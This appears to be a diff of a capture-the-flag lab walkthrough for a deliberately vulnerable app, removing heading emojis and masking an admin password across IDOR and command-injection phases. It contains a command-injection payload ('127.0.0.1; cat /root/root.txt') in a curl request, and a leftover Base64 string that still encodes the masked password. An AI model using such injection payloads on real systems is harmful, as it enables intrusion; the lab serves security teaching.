@@ -4,7 +4,7 @@ This document outlines the step-by-step solution for the **ByteSize** vulnerable
 
 ---
 
-## 🕵️ Phase 1: Information Gathering (Developer Token Leak)
+## Phase 1: Information Gathering (Developer Token Leak)
 
 ### The Objective
 Identify exposed endpoints or backup files to gain an initial foothold.
@@ -30,7 +30,7 @@ Identify exposed endpoints or backup files to gain an initial foothold.
 
 ---
 
-## 🔓 Phase 2: Insecure Direct Object Reference (IDOR)
+## Phase 2: Insecure Direct Object Reference (IDOR)
 
 ### The Objective
 Utilize the leaked token to query the API and access confidential internal notes.
@@ -54,11 +54,11 @@ Utilize the leaked token to query the API and access confidential internal notes
    }
    ```
 6. **User Flag Captured**: `VulnOS{REDACTED}`
-7. **Credentials Captured**: `admin` / `Admin_Pass_2026!`
+7. **Credentials Captured**: `admin` / `*******`
 
 ---
 
-## 💥 Phase 3: Command Injection (Root Compromise)
+## Phase 3: Command Injection (Root Compromise)
 
 ### The Objective
 Leverage the administrative credentials to achieve Remote Code Execution (RCE) and retrieve the final Root Flag.
@@ -82,7 +82,7 @@ Leverage the administrative credentials to achieve Remote Code Execution (RCE) a
      -d '{"host":"127.0.0.1; cat /root/root.txt"}' \
      http://<TARGET_IP>/api/admin/ping
    ```
-   *(Note: `YWRtaW46QWRtaW5fUGFzc18yMDI2IQ==` is the Base64 encoding of `admin:Admin_Pass_2026!`)*
+   *(Note: `YWRtaW46QWRtaW5fUGFzc18yMDI2IQ==` is the Base64 encoding of `admin:******`)*
 7. The server executes the ping command, followed by the `cat` command, returning the final flag in the JSON output:
    ```json
    {
